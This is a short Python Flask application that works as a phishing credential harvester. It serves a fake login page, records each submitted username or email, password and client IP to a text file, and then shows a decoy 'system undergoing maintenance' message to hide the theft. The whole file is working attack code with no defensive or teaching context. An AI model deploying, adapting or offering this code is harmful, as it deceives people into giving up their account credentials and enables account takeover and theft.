import os
from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
Information_file = os.path.join(BASE_DIR, 'Account_collected.txt')

@app.route('/')
def home():
    # Fake login page entry
    return render_template('fake_login.html')

@app.route('/fake_login', methods=['POST'])
def fake_login():
    identifier = request.form.get('identifier')  # Username or Email
    password = request.form.get('password')
    ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(Information_file, 'a') as f:
        f.write(f"[{timestamp}] IP: {ip}, Identifier: {identifier}, Password: {password}\n")

    return "<h3 style='color:red;'>The system is undergoing maintenance, please try again later.</h3>"

if __name__ == '__main__':
    app.run(debug=True)
